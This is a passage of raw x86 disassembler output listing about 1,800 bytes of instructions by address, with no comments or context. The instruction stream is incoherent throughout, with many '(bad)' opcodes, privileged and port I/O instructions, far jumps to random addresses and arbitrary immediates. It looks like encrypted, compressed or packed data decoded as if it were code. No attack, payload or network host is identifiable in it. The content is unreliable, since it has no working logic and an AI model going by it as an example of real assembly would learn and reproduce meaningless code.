  41ef83:	sti    
  41ef84:	pop    es
  41ef85:	adc    DWORD PTR fs:[edx-0x79],esi
  41ef89:	dec    ebx
  41ef8a:	jl     0x41efc3
  41ef8c:	cmp    eax,0xf5f39e68
  41ef91:	stos   BYTE PTR es:[edi],al
  41ef92:	adc    al,0x2d
  41ef94:	aam    0x4d
  41ef96:	shl    DWORD PTR [esi],0x51
  41ef99:	push   es
  41ef9a:	sub    al,0x5
  41ef9c:	sbb    esi,ecx
  41ef9e:	mov    ds:0x18b18c97,eax
  41efa3:	jne    0x41efd9
  41efa5:	push   0xffffff9d
  41efa7:	iret   
  41efa8:	je     0x41ef94
  41efaa:	xor    bl,BYTE PTR [ebp-0xa]
  41efad:	neg    ch
  41efaf:	inc    esp
  41efb0:	mov    cs,WORD PTR [ebx]
  41efb2:	rcl    ch,cl
  41efb4:	jns    0x41ef5b
  41efb6:	mov    ss,esp
  41efb8:	jmp    0xb5da:0x758d7717
  41efbf:	push   ebx
  41efc0:	jbe    0x41efbd
  41efc2:	dec    esp
  41efc3:	mov    bh,0xe8
  41efc5:	leave  
  41efc6:	fstp   DWORD PTR [eax]
  41efc8:	imul   ebp,DWORD PTR [ebx+0x28c3bbc9],0x14
  41efcf:	push   cs
  41efd0:	mov    edx,0x53b951bd
  41efd6:	mov    ds,WORD PTR [ecx-0x6b]
  41efd9:	add    ebp,edx
  41efdb:	fmul   st,st(6)
  41efdd:	mov    ebp,edi
  41efdf:	sbb    DWORD PTR [eax+edi*8],ebp
  41efe2:	ins    BYTE PTR es:[edi],dx
  41efe3:	sub    BYTE PTR [ebx+0x6a],0xbc
  41efe7:	pop    eax
  41efe8:	loope  0x41f058
  41efea:	mov    esp,esi
  41efec:	icebp  
  41efed:	cdq    
  41efee:	cmp    al,0x4a
  41eff0:	fstp   TBYTE PTR [ebp+0x4d]
  41eff3:	sub    ebp,DWORD PTR [edx-0x42]
  41eff6:	in     eax,0xb7
  41eff8:	sbb    DWORD PTR [ebp-0x73],esp
  41effb:	adc    ah,BYTE PTR [esi+0x51]
  41effe:	fwait
  41efff:	or     al,0x7d
  41f001:	arpl   WORD PTR [ebx+0x69681813],si
  41f007:	shr    esp,0x4
  41f00a:	stos   BYTE PTR es:[edi],al
  41f00b:	sbb    DWORD PTR [ebx-0x64e85e46],esp
  41f011:	stos   DWORD PTR es:[edi],eax
  41f012:	add    eax,0xabf79123
  41f017:	inc    edi
  41f018:	cld    
  41f019:	push   edx
  41f01a:	ret    
  41f01b:	rcl    esp,1
  41f01d:	cmp    edx,edi
  41f01f:	xchg   edi,eax
  41f020:	clc    
  41f021:	pop    ebp
  41f022:	dec    ebx
  41f023:	or     DWORD PTR [edx+0x36a15682],ecx
  41f029:	fsubr  DWORD PTR [esi+0x1393a620]
  41f02f:	outs   dx,BYTE PTR ds:[esi]
  41f030:	enter  0x50c5,0x7f
  41f034:	dec    esp
  41f035:	or     al,0xef
  41f037:	lock hlt 
  41f039:	and    al,0x22
  41f03b:	mov    dh,0x32
  41f03d:	dec    ebx
  41f03e:	mov    DWORD PTR [ebx],esp
  41f040:	pop    esp
  41f041:	mov    ebx,0xed8836a1
  41f046:	push   0xe3a8c20b
  41f04b:	ja     0x41efd1
  41f04d:	inc    ecx
  41f04e:	ins    BYTE PTR es:[edi],dx
  41f04f:	out    0xf2,eax
  41f051:	outs   dx,BYTE PTR ds:[esi]
  41f052:	les    ecx,FWORD PTR [ebp-0x5f]
  41f055:	cmp    BYTE PTR [ebp-0x34752700],cl
  41f05b:	pop    ebx
  41f05c:	push   DWORD PTR [edi+0x25]
  41f05f:	push   edx
  41f060:	sbb    al,0xd7
  41f062:	js     0x41eff1
  41f064:	xor    al,0x3b
  41f066:	pop    es
  41f067:	ins    DWORD PTR es:[edi],dx
  41f068:	jmp    0x87016bb2
  41f06d:	xor    ch,dh
  41f06f:	xchg   DWORD PTR ds:0xf887fa5b,ebx
  41f075:	popf   
  41f076:	sub    BYTE PTR [ebx+0x6ff63a27],bh
  41f07c:	sbb    eax,0xfeef0660
  41f081:	imul   edi
  41f083:	jb     0x41f078
  41f085:	retf   0xe33f
  41f088:	je     0x41f069
  41f08a:	xchg   ecx,eax
  41f08b:	lds    ebx,FWORD PTR [eax]
  41f08d:	sub    BYTE PTR [esp+ebp*4+0x32],ch
  41f091:	fcomp  DWORD PTR [edx-0x57c6524b]
  41f097:	inc    edi
  41f098:	ins    BYTE PTR es:[edi],dx
  41f099:	je     0x41f10b
  41f09b:	sub    BYTE PTR [bx+di+0x59e],cl
  41f0a0:	loopne 0x41f0bd
  41f0a2:	mov    edi,DWORD PTR [ebp-0x36]
  41f0a5:	push   esp
  41f0a6:	mov    ah,BYTE PTR [ebp-0x7c71c64c]
  41f0ac:	clc    
  41f0ad:	pop    es
  41f0ae:	dec    esp
  41f0af:	adc    eax,0xd5c905c9
  41f0b4:	ja     0x41f102
  41f0b6:	hlt    
  41f0b7:	cmp    eax,0xbb25cbbb
  41f0bc:	std    
  41f0bd:	xchg   edx,eax
  41f0be:	(bad)  
  41f0bf:	fcomip st,st(5)
  41f0c1:	and    al,BYTE PTR [esi-0x100084]
  41f0c7:	fsub   st(7),st
  41f0c9:	out    dx,al
  41f0ca:	cmp    eax,0x7ffe91b0
  41f0cf:	fcomp  QWORD PTR [esi+0x15]
  41f0d2:	adc    dh,al
  41f0d4:	sbb    DWORD PTR [edi],0x44
  41f0d7:	mov    esi,0xf08fc6f8
  41f0dc:	daa    
  41f0dd:	pop    ds
  41f0de:	stc    
  41f0df:	(bad)  
  41f0e1:	mov    bl,al
  41f0e3:	cmp    DWORD PTR [ecx-0x10f18ce3],ecx
  41f0e9:	sub    bl,BYTE PTR [edx+0xc]
  41f0ec:	lods   eax,DWORD PTR ds:[esi]
  41f0ed:	xchg   ebp,eax
  41f0ee:	lds    esp,FWORD PTR [edx]
  41f0f0:	xchg   esi,eax
  41f0f1:	int3   
  41f0f2:	inc    edi
  41f0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0f4:	jns    0x41f0f2
  41f0f6:	std    
  41f0f7:	aaa    
  41f0f8:	stc    
  41f0f9:	ret    
  41f0fa:	scas   eax,DWORD PTR es:[edi]
  41f0fb:	push   ss
  41f0fc:	sbb    ch,al
  41f0fe:	sti    
  41f0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f100:	mov    ch,0x43
  41f102:	push   ss
  41f103:	mov    ch,BYTE PTR [ebp+0x2a]
  41f106:	mov    ch,0x4b
  41f108:	mov    esi,0xae263e63
  41f10d:	je     0x41f0a1
  41f10f:	test   al,0xf8
  41f111:	mov    BYTE PTR [eax+0x29],dh
  41f114:	push   ecx
  41f115:	das    
  41f116:	lea    ecx,[esi-0x68bd936a]
  41f11c:	test   dh,cl
  41f11e:	push   ss
  41f11f:	or     BYTE PTR [ecx-0x50c78db4],cl
  41f125:	lds    ecx,FWORD PTR [ecx-0x4c]
  41f128:	ror    DWORD PTR ds:[ebx-0x19],cl
  41f12c:	jl     0x41f17c
  41f12e:	nop
  41f12f:	push   edi
  41f130:	call   0x84f9:0x32e6307d
  41f137:	popa   
  41f138:	add    DWORD PTR [esp+eiz*2-0x26],esi
  41f13c:	sbb    bl,0x65
  41f13f:	pop    eax
  41f140:	xor    esp,DWORD PTR [edx]
  41f142:	inc    ebx
  41f143:	bound  eax,QWORD PTR [ecx-0x7e]
  41f146:	and    al,0xf4
  41f148:	popf   
  41f149:	scas   eax,DWORD PTR es:[edi]
  41f14a:	and    eax,0x1e046503
  41f14f:	retf   
  41f150:	dec    edi
  41f151:	jo     0x41f1ca
  41f153:	jl     0x41f16e
  41f155:	mov    ch,0x37
  41f157:	inc    eax
  41f158:	je     0x41f17f
  41f15a:	push   0xffffff8c
  41f15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f15d:	fld    DWORD PTR [eax]
  41f15f:	pop    ebp
  41f160:	inc    esp
  41f161:	jne    0x41f182
  41f163:	test   eax,0xc55c50ed
  41f168:	call   0xeb12f39
  41f16d:	cmp    dl,bl
  41f16f:	and    BYTE PTR [ebp+0x498e206f],dh
  41f175:	cmp    eax,0x3f8a6184
  41f17a:	into   
  41f17b:	je     0x41f1d3
  41f17d:	or     al,0x36
  41f17f:	adc    ch,BYTE PTR [edx+edx*2]
  41f182:	pop    ebp
  41f183:	inc    edi
  41f184:	scas   al,BYTE PTR es:[edi]
  41f185:	int    0x31
  41f187:	test   al,0x51
  41f189:	gs jbe 0x41f1a2
  41f18c:	push   ss
  41f18d:	sub    DWORD PTR [esi-0x3fad3398],ecx
  41f193:	sbb    eax,0x9a0244c4
  41f198:	push   ecx
  41f199:	icebp  
  41f19a:	or     DWORD PTR [esi],esi
  41f19c:	adc    cl,dh
  41f19e:	aaa    
  41f19f:	test   edx,ecx
  41f1a1:	shr    BYTE PTR [edx+0x30],cl
  41f1a4:	repnz xchg ecx,eax
  41f1a6:	add    dh,BYTE PTR [edx+esi*1-0x57e6cb23]
  41f1ad:	inc    ecx
  41f1ae:	repz imul edx,DWORD PTR [edi+ecx*4-0x6f],0xd73901b4
  41f1b7:	add    bh,BYTE PTR [eax+0x5554db7d]
  41f1bd:	mov    eax,0x464d8c2f
  41f1c2:	imul   edx,ebx,0x4236818c
  41f1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c9:	xchg   ebp,eax
  41f1ca:	repnz mov esi,0x6913c499
  41f1d0:	dec    esi
  41f1d1:	mov    eax,ds:0xa29b0e79
  41f1d6:	js     0x41f24b
  41f1d8:	das    
  41f1d9:	xchg   ebx,eax
  41f1da:	arpl   WORD PTR [ecx],cx
  41f1dc:	xchg   esp,edx
  41f1de:	xor    al,BYTE PTR [eax-0x1f518801]
  41f1e4:	iret   
  41f1e5:	jne    0x41f21b
  41f1e7:	ror    BYTE PTR [eax+0x413e9b01],1
  41f1ed:	repz ss inc edi
  41f1f0:	test   DWORD PTR [esi+0x591fcef8],0x4ff1f770
  41f1fa:	jno    0x41f19d
  41f1fc:	imul   DWORD PTR [esi-0x723bed2f]
  41f202:	jne    0x41f282
  41f204:	jle    0x41f280
  41f206:	push   ebx
  41f207:	out    dx,al
  41f208:	xchg   ebp,eax
  41f209:	adc    DWORD PTR [ebp-0x2f7e9dbe],ebp
  41f20f:	popa   
  41f210:	push   edx
  41f211:	ret    
  41f212:	mov    bh,0x24
  41f214:	cmp    dh,BYTE PTR [ecx-0x4e]
  41f217:	jp     0x41f1c5
  41f219:	xchg   ebp,eax
  41f21a:	inc    edx
  41f21b:	jmp    0x41f25a
  41f21d:	adc    edi,esp
  41f21f:	adc    DWORD PTR [edx+0x31524813],eax
  41f225:	fldenv [ecx+0x3dcba337]
  41f22b:	call   0xff4:0x72b9d94
  41f232:	fnstsw WORD PTR [ecx]
  41f234:	jge    0x41f229
  41f236:	(bad)  
  41f237:	ja     0x41f2b7
  41f239:	or     bh,al
  41f23b:	mov    ebx,0xfe5982df
  41f240:	or     ebx,ebp
  41f242:	pop    esi
  41f243:	xchg   ebp,eax
  41f244:	adc    al,0xe0
  41f246:	inc    ebx
  41f247:	pop    ds
  41f248:	les    edi,FWORD PTR [esi-0x8]
  41f24b:	jmp    0xbcbac5f7
  41f250:	stc    
  41f251:	dec    ebx
  41f252:	and    al,0x91
  41f254:	xchg   esp,eax
  41f255:	add    al,0x49
  41f257:	dec    esi
  41f258:	out    0xa9,al
  41f25a:	push   0xffffff88
  41f25c:	sub    BYTE PTR [ebp+eax*8+0x59b0ccb9],cl
  41f263:	int    0xa7
  41f265:	and    BYTE PTR [ecx],ch
  41f267:	pop    eax
  41f268:	inc    edx
  41f269:	pop    es
  41f26a:	adc    DWORD PTR [ebp+0x46],0x8ca2a2ab
  41f271:	push   edx
  41f272:	jl     0x41f205
  41f274:	add    bp,dx
  41f277:	jmp    0x550d:0x723c4807
  41f27e:	pop    ecx
  41f27f:	xchg   edi,eax
  41f280:	retf   0xe118
  41f283:	xor    DWORD PTR [ebx-0x5e],ebx
  41f286:	and    esp,DWORD PTR [ebx]
  41f288:	(bad)  
  41f289:	ret    
  41f28a:	fsub   DWORD PTR [ebx+0x429430b5]
  41f290:	sub    DWORD PTR [ebx-0x76b745f1],esp
  41f296:	pushf  
  41f297:	cmp    dl,BYTE PTR [edx-0x5b9a38f8]
  41f29d:	push   ss
  41f29e:	outs   dx,DWORD PTR ds:[esi]
  41f29f:	fidiv  DWORD PTR [ecx-0x7a]
  41f2a2:	fst    QWORD PTR [eax-0x5d4aee2c]
  41f2a8:	(bad)  
  41f2a9:	lea    ecx,[edx+0x50d61855]
  41f2af:	xlat   BYTE PTR ds:[ebx]
  41f2b0:	adc    eax,0x556bdb1b
  41f2b5:	lods   al,BYTE PTR ds:[esi]
  41f2b6:	cli    
  41f2b7:	sub    ch,bl
  41f2b9:	xchg   edx,esi
  41f2bb:	fidiv  WORD PTR gs:[edi-0xb31c109]
  41f2c2:	dec    edi
  41f2c3:	icebp  
  41f2c4:	xchg   ebx,edi
  41f2c6:	(bad)  
  41f2c7:	xor    DWORD PTR [ebx+eiz*4],edx
  41f2ca:	push   esp
  41f2cb:	repz call 0xd1e149eb
  41f2d1:	push   0xfffffff1
  41f2d3:	xor    DWORD PTR [esi-0x676374f6],esi
  41f2d9:	sub    DWORD PTR ds:0x839ef128,esi
  41f2df:	int    0x82
  41f2e1:	pushf  
  41f2e2:	mov    BYTE PTR ds:0xf6ee6c6c,0x6b
  41f2e9:	stc    
  41f2ea:	jl     0x41f279
  41f2ec:	xlat   BYTE PTR ds:[ebx]
  41f2ed:	fdiv   DWORD PTR [eax]
  41f2ef:	repz add BYTE PTR [ebx],al
  41f2f2:	mov    al,0x56
  41f2f4:	out    0x1b,eax
  41f2f6:	inc    esi
  41f2f7:	jne    0x41f28b
  41f2f9:	mov    al,0xa1
  41f2fb:	test   BYTE PTR [edx],bl
  41f2fd:	sar    DWORD PTR [edi-0x10ec2bcc],1
  41f303:	cmp    eax,0x79f6fe41
  41f308:	imul   ebp,DWORD PTR [eax+0x2f05cc09],0xffffff9e
  41f30f:	jbe    0x41f2ca
  41f311:	loopne 0x41f2b9
  41f313:	inc    esp
  41f314:	hlt    
  41f315:	xor    al,0xb5
  41f317:	sub    edi,edx
  41f319:	daa    
  41f31a:	push   es
  41f31b:	imul   ebx,DWORD PTR [eax+0x41b1a789],0x16
  41f322:	cmp    al,cl
  41f324:	scas   al,BYTE PTR es:[edi]
  41f325:	push   ebx
  41f326:	adc    al,0xd5
  41f328:	and    cl,dh
  41f32a:	ins    BYTE PTR es:[edi],dx
  41f32b:	scas   al,BYTE PTR es:[edi]
  41f32c:	(bad)  
  41f32d:	add    eax,0xbf3c4057
  41f332:	std    
  41f333:	and    DWORD PTR [esi-0x48736436],0x45ba00f1
  41f33d:	aam    0x31
  41f33f:	jmp    0x41f348
  41f341:	je     0x41f36e
  41f343:	mov    ds:0xb00c05b,al
  41f348:	push   ecx
  41f349:	iret   
  41f34a:	mov    dh,0xd3
  41f34c:	push   0xe770023a
  41f351:	imul   ebx,DWORD PTR [eax-0x4c],0x3
  41f355:	sbb    edx,DWORD PTR [ebx+0x29ce4f8d]
  41f35b:	pushf  
  41f35c:	dec    edx
  41f35d:	mov    esp,0xad12ee6e
  41f362:	loop   0x41f355
  41f364:	and    edi,DWORD PTR [edi]
  41f366:	shl    DWORD PTR [ecx+0x24ecbbb2],cl
  41f36c:	dec    edi
  41f36d:	pop    ss
  41f36e:	jnp    0x41f2f1
  41f370:	popf   
  41f371:	mov    esp,0xe830888b
  41f376:	enter  0xb0d1,0x89
  41f37a:	out    0x2a,al
  41f37c:	fild   WORD PTR [esi]
  41f37e:	and    eax,0x593270b2
  41f383:	sub    ebx,DWORD PTR [ecx+0x443a5925]
  41f389:	or     ebx,eax
  41f38b:	dec    eax
  41f38c:	xchg   edi,eax
  41f38d:	adc    bl,BYTE PTR [ebp-0x65]
  41f390:	mov    bh,0x94
  41f392:	xor    ah,BYTE PTR [edx+ecx*2+0x5f4b162f]
  41f399:	sbb    bl,BYTE PTR [ecx-0x68]
  41f39c:	leave  
  41f39d:	call   0x17c6:0xf7b324e9
  41f3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a5:	push   cs
  41f3a6:	in     eax,0xfd
  41f3a8:	pop    ds
  41f3a9:	jle    0x41f421
  41f3ab:	shl    ebx,cl
  41f3ad:	sub    bl,bh
  41f3af:	pop    esi
  41f3b0:	xchg   ebp,eax
  41f3b1:	cdq    
  41f3b2:	sbb    BYTE PTR [edi],0xfc
  41f3b5:	pop    ds
  41f3b6:	scas   eax,DWORD PTR es:[edi]
  41f3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b8:	jg     0x41f372
  41f3ba:	jnp    0x41f34c
  41f3bc:	push   ebp
  41f3bd:	cmc    
  41f3be:	std    
  41f3bf:	test   eax,0x1f64885f
  41f3c4:	aaa    
  41f3c5:	imul   ebp,DWORD PTR [edx+0x58],0xffffffa9
  41f3c9:	mov    cl,0x4b
  41f3cb:	into   
  41f3cc:	pop    eax
  41f3cd:	sahf   
  41f3ce:	dec    esp
  41f3cf:	sbb    al,0xbc
  41f3d1:	aam    0xd3
  41f3d3:	out    0x19,eax
  41f3d5:	xor    dl,BYTE PTR [esi]
  41f3d7:	sub    eax,0x576432b0
  41f3dc:	dec    eax
  41f3dd:	cmp    eax,DWORD PTR [esi-0x29]
  41f3e0:	addr16 jb 0x41f3f2
  41f3e3:	pop    eax
  41f3e4:	repnz sub edi,DWORD PTR [edi]
  41f3e7:	or     edx,DWORD PTR [esi]
  41f3e9:	(bad)  
  41f3ea:	pop    edi
  41f3eb:	arpl   WORD PTR [edi],sp
  41f3ed:	popf   
  41f3ee:	sub    DWORD PTR [eax-0x2ba6d9a],ecx
  41f3f4:	fbld   TBYTE PTR [eax-0x7515eb54]
  41f3fa:	pushf  
  41f3fb:	mov    ebx,0x79db70d8
  41f400:	jle    0x41f39c
  41f402:	test   BYTE PTR [edx+ecx*1-0xea7dc39],dl
  41f409:	lods   eax,DWORD PTR ds:[esi]
  41f40a:	cmp    eax,0x6922d051
  41f40f:	inc    edx
  41f410:	xchg   DWORD PTR [edx+0x71f0b75],eax
  41f416:	outs   dx,BYTE PTR ds:[esi]
  41f417:	cdq    
  41f418:	push   ebp
  41f419:	sbb    eax,0x6ef8a5c9
  41f41e:	add    DWORD PTR [eax+0x3dca424f],esp
  41f424:	xchg   esp,eax
  41f425:	dec    esp
  41f426:	lahf   
  41f427:	xor    bl,bh
  41f429:	mov    bl,0xfb
  41f42b:	jbe    0x41f44b
  41f42d:	dec    esi
  41f42e:	(bad)  
  41f42f:	(bad)
  41f433:	lock repnz in eax,dx
  41f436:	jg     0x41f402
  41f438:	rol    ecx,1
  41f43a:	iret   
  41f43b:	and    bh,BYTE PTR [ebx-0x63]
  41f43e:	sub    eax,edi
  41f440:	aam    0xd0
  41f442:	in     al,dx
  41f443:	push   ds
  41f444:	mov    ebp,0xc4ef1773
  41f449:	(bad)  
  41f44a:	xor    eax,0x4051de36
  41f44f:	fwait
  41f450:	mov    esi,0x41881a23
  41f455:	data16 mov sp,0xa3c3
  41f45a:	jle    0x41f41e
  41f45c:	lahf   
  41f45d:	aaa    
  41f45e:	loop   0x41f415
  41f460:	bound  esp,QWORD PTR [ebp+0x17e3c6f5]
  41f466:	outs   dx,BYTE PTR ds:[esi]
  41f467:	jecxz  0x41f41e
  41f469:	aam    0xab
  41f46b:	add    eax,0x7cb4d1cd
  41f470:	mov    ebp,0x38c61a55
  41f475:	dec    edi
  41f476:	in     eax,dx
  41f477:	ja     0x41f426
  41f479:	pop    ebp
  41f47a:	fild   WORD PTR [edi]
  41f47c:	or     DWORD PTR [eax],0x9df28d54
  41f482:	xchg   ebx,eax
  41f483:	jge    0x41f495
  41f485:	sub    cl,cl
  41f487:	pushf  
  41f488:	xor    ecx,DWORD PTR [eax+0x3a]
  41f48b:	fxch   st(2)
  41f48d:	push   esp
  41f48e:	sbb    dl,BYTE PTR [edx+edi*4-0x470e4afb]
  41f495:	imul   ebx,edx,0x60
  41f498:	mov    dh,0x4f
  41f49a:	bound  esi,QWORD PTR [esi-0x45c301e0]
  41f4a0:	sbb    dh,BYTE PTR [ebx+0x23de27d0]
  41f4a6:	mov    esi,0x98f1c687
  41f4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ac:	clc    
  41f4ad:	jp     0x41f434
  41f4af:	sub    BYTE PTR [ecx+0x7ded9865],dh
  41f4b5:	and    ebx,DWORD PTR [ebp-0x66]
  41f4b8:	add    edi,DWORD PTR [ecx-0x2d9cf1b2]
  41f4be:	sub    eax,0x7fe1ad00
  41f4c3:	stos   BYTE PTR es:[edi],al
  41f4c4:	or     dh,BYTE PTR [edx+esi*2-0x1c1feb1d]
  41f4cb:	add    BYTE PTR [esi],dh
  41f4cd:	movups xmm1,xmm7
  41f4d0:	imul   edi,ebp,0xa02f1310
  41f4d6:	xor    BYTE PTR [esi-0x4],ch
  41f4d9:	or     BYTE PTR [esi+0x52817dd8],bh
  41f4df:	inc    esi
  41f4e0:	jbe    0x41f475
  41f4e2:	mov    cl,0x4c
  41f4e4:	ret    0x3959
  41f4e7:	ret    
  41f4e8:	outs   dx,BYTE PTR ds:[esi]
  41f4e9:	pop    edx
  41f4ea:	xor    BYTE PTR [eax-0x5e71e79a],dh
  41f4f0:	mov    WORD PTR [esi+eiz*8+0x65],?
  41f4f4:	jecxz  0x41f483
  41f4f6:	push   ebp
  41f4f7:	aam    0xa
  41f4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4fa:	dec    edx
  41f4fb:	mov    cl,0x44
  41f4fd:	or     eax,0x42948695
  41f502:	daa    
  41f503:	(bad)  
  41f504:	mov    BYTE PTR [edi+0x29602b40],dl
  41f50a:	inc    ecx
  41f50b:	xor    edi,edx
  41f50d:	mov    eax,0xc4606548
  41f512:	rol    BYTE PTR [edx],cl
  41f514:	mov    bl,0xe2
  41f516:	xlat   BYTE PTR ds:[ebx]
  41f517:	jns    0x41f49b
  41f519:	inc    edi
  41f51a:	fcomip st,st(1)
  41f51c:	xor    bl,BYTE PTR [edi-0x4]
  41f51f:	lea    esi,[edi-0x48a41c44]
  41f525:	into   
  41f526:	jg     0x41f526
  41f528:	in     eax,dx
  41f529:	adc    eax,0x57ab8023
  41f52e:	scas   eax,DWORD PTR es:[edi]
  41f52f:	or     bl,BYTE PTR [edi]
  41f531:	and    bh,0x7e
  41f534:	stc    
  41f535:	lahf   
  41f536:	mov    esi,0xca7ce0c9
  41f53b:	and    ch,BYTE PTR [ecx]
  41f53d:	or     edi,DWORD PTR [esi]
  41f53f:	out    0xda,al
  41f541:	jae    0x41f5ba
  41f543:	sub    eax,0xe356048e
  41f548:	or     dl,bl
  41f54a:	adc    DWORD PTR [ecx-0x4c398b7c],edx
  41f550:	mov    bh,0x9f
  41f552:	mov    edx,DWORD PTR [ecx]
  41f554:	dec    ecx
  41f555:	sub    BYTE PTR [esp+ecx*1],0x16
  41f559:	jmp    0xa569:0x54c9194a
  41f560:	sub    BYTE PTR [ebx+0x2a],al
  41f563:	mov    BYTE PTR [edi+0x613441f2],cl
  41f569:	arpl   dx,ax
  41f56b:	xchg   BYTE PTR [ebp+edx*2-0x279ea55f],al
  41f572:	push   esp
  41f573:	xor    al,0xba
  41f575:	gs inc esp
  41f577:	cmp    al,0xcf
  41f579:	adc    ch,bh
  41f57b:	xor    eax,0x8dc650c5
  41f580:	mov    al,ds:0xf224401b
  41f585:	jbe    0x41f54a
  41f587:	push   0xffffff9d
  41f589:	dec    edx
  41f58a:	ins    BYTE PTR es:[edi],dx
  41f58b:	mov    esi,0xab515bb2
  41f590:	xchg   esp,eax
  41f591:	loop   0x41f537
  41f593:	in     eax,0x50
  41f595:	xor    al,0x22
  41f597:	sahf   
  41f598:	adc    esp,DWORD PTR [esi+0xf]
  41f59b:	sub    eax,0xe793f32f
  41f5a0:	dec    DWORD PTR [edx]
  41f5a2:	ja     0x41f56b
  41f5a4:	mov    ebx,0xdfc5f47c
  41f5a9:	loop   0x41f5a4
  41f5ab:	out    0x7f,eax
  41f5ad:	mov    WORD PTR [ebx+0x37],ds
  41f5b0:	(bad)  
  41f5b1:	sub    eax,0xa724edf6
  41f5b6:	pop    ss
  41f5b7:	cmp    eax,0x8123a8b5
  41f5bc:	bound  edx,QWORD PTR [ecx+edx*2-0x54ad55e7]
  41f5c3:	push   es
  41f5c4:	xor    cl,BYTE PTR [eax]
  41f5c6:	gs pop ebp
  41f5c8:	inc    esp
  41f5c9:	xchg   ebx,eax
  41f5ca:	mov    ds:0x989ef473,al
  41f5cf:	cld    
  41f5d0:	and    bl,ch
  41f5d2:	ss jno 0x41f566
  41f5d5:	pop    ss
  41f5d6:	mov    bl,0x9
  41f5d8:	and    DWORD PTR [edx+eax*1],esi
  41f5db:	jo     0x41f598
  41f5dd:	(bad)  
  41f5de:	pop    edi
  41f5df:	or     eax,0xdf3ea36
  41f5e4:	mov    ecx,DWORD PTR [ecx]
  41f5e6:	inc    ebp
  41f5e7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f5e9:	mov    edi,0x3181a398
  41f5ee:	sahf   
  41f5ef:	(bad)  
  41f5f1:	fistp  WORD PTR [edi]
  41f5f3:	jecxz  0x41f61a
  41f5f5:	inc    edx
  41f5f6:	or     esp,DWORD PTR [esi+esi*1-0x2b]
  41f5fa:	repz sub eax,0x4daa0066
  41f600:	jae    0x41f601
  41f602:	mov    dl,0x35
  41f604:	push   ecx
  41f605:	into   
  41f606:	(bad)  
  41f607:	lahf   
  41f608:	mov    ah,bh
  41f60a:	in     eax,dx
  41f60b:	test   ebp,ecx
  41f60d:	cwde   
  41f60e:	or     eax,0x1e726d47
  41f613:	(bad)  
  41f614:	lods   al,BYTE PTR ds:[esi]
  41f615:	sub    BYTE PTR [edx-0x5562af13],bh
  41f61b:	add    al,0x8e
  41f61d:	sub    BYTE PTR [esi-0x68],ah
  41f620:	cmp    eax,0xd04de775
  41f625:	fbld   TBYTE PTR [esi-0x3467dafa]
  41f62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f62c:	test   al,0x7
  41f62e:	cmp    DWORD PTR [ecx+0x15eda949],0xffffff9c
  41f635:	mov    ds:0x45abfb79,eax
  41f63a:	std    
  41f63b:	push   eax
  41f63c:	xchg   esp,eax
  41f63d:	dec    ebp
  41f63e:	lahf   
  41f63f:	sbb    eax,0x5b2b466c
  41f644:	fild   QWORD PTR [esi+esi*1+0x13393224]
  41f64b:	jg     0x41f607
  41f64d:	stos   BYTE PTR es:[edi],al
  41f64e:	jo     0x41f632
  41f650:	add    ch,BYTE PTR [edx+edx*8+0x6]
  41f654:	dec    ecx
  41f655:	ret    0x9c89
  41f658:	cmp    DWORD PTR [ecx-0x62cd8d32],ebx
  41f65e:	arpl   bp,cx
  41f660:	call   0x4d65:0xc71ee1fd
  41f667:	push   ecx
  41f668:	or     eax,0xaab2b752
  41f66d:	xchg   DWORD PTR [esp+esi*2+0x6af38943],ebp
  41f674:	push   ecx
  41f675:	push   0x56
  41f677:	adc    al,0xad
  41f679:	and    edx,DWORD PTR [esi+0xb]
  41f67c:	sbb    bh,BYTE PTR [ebx]
  41f67e:	adc    eax,0xac225ccc
  41f683:	aad    0x49
  41f685:	rcr    BYTE PTR [esp+ebx*4+0x51dc9428],0x53
  41f68d:	and    ah,BYTE PTR [ebp+0x26e9749e]
  41f693:	fnstsw WORD PTR [ecx-0xe40f41d]
  41f699:	aaa    
  41f69a:	aas    
  41f69b:	(bad)  
  41f69c:	adc    ebp,DWORD PTR [edi-0x640a12c]
  41f6a2:	test   dl,0x39
  41f6a5:	add    BYTE PTR [ebx],dh
  41f6a7:	mov    esi,0xda3c6403
  41f6ac:	cld    
  41f6ad:	stc    
  41f6ae:	xchg   esp,eax
  41f6af:	and    eax,0xa4890649
  41f6b4:	push   ebp
  41f6b5:	imul   ecx,DWORD PTR [ebp+0x13e68841],0x79
  41f6bc:	sbb    ecx,edx
  41f6be:	jecxz  0x41f6dd
  41f6c0:	mov    ah,0x37
  41f6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c3:	subps  xmm5,XMMWORD PTR [eax]
  41f6c6:	ds out dx,al
  41f6c8:	fist   DWORD PTR [edi+0x6379e1d4]
  41f6ce:	scas   al,BYTE PTR es:[edi]
  41f6cf:	mov    BYTE PTR [ecx+0x11],bh
  41f6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6d3:	push   cs
  41f6d4:	and    BYTE PTR [ebx-0x62b20bb1],ah
  41f6da:	xor    dl,ah
  41f6dc:	into   
  41f6dd:	inc    ebp
  41f6de:	call   0x586b3183
  41f6e3:	ss dec edx
  41f6e5:	daa    
  41f6e6:	fst    DWORD PTR [ecx]
  41f6e8:	adc    eax,0x754b5ebe
  41f6ed:	hlt    
  41f6ee:	data16 mov al,0x22
  41f6f1:	push   0xcc689827
  41f6f6:	ret    0x7cf7
  41f6f9:	pop    eax
  41f6fa:	jb     0x41f704
  41f6fc:	jno    0x41f691
  41f6fe:	inc    ebp
  41f6ff:	cmp    eax,0x15a9b336
  41f704:	sbb    esi,ecx
  41f706:	and    eax,0xa3a3b923
  41f70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f70d:	out    0x6d,eax
  41f70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f710:	mov    esi,0x3eefd79b
  41f715:	(bad)  
  41f716:	das    
